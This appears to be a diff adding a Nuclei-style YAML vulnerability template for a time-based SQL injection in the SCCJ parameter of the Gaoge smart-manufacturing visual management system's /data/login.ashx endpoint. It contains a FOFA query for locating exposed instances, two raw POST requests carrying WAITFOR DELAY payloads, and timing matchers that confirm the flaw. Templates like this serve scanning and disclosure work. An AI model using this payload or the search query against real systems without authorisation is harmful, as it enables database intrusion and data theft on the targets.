@@ -1,0 +1,31 @@
+id: gaoge-mes-sccj-sqli
+info:
+  name: 高格智能制造目视化系统SCCJ组件SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="高格智能制造目视化系统"
+      该系统SCCJ接口存在SQL注入漏洞，攻击者可通过构造恶意数据库查询语句实现对后端数据库的未授权访问与操作，可能导致敏感数据泄露或数据完整性受损。
+  tags: 高格智能制造目视化系统
+http:
+- raw:
+  - |
+    POST /data/login.ashx HTTP/1.1
+    Host: {{Hostname}}
+    X-Requested-With: XMLHttpRequest
+    Content-Type: application/x-www-form-urlencoded
+
+    UNAMESM=&UNAME=&PWD=&pgbg=false&gdbg=true&SCCJ=14';WAITFOR DELAY '0:0:5'--&type=0
+  - |
+    POST /data/login.ashx HTTP/1.1
+    Host: {{Hostname}}
+    X-Requested-With: XMLHttpRequest
+    Content-Type: application/x-www-form-urlencoded
+
+    UNAMESM=&UNAME=&PWD=&pgbg=false&gdbg=true&SCCJ=14';WAITFOR DELAY '0:0:8'--&type=0
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
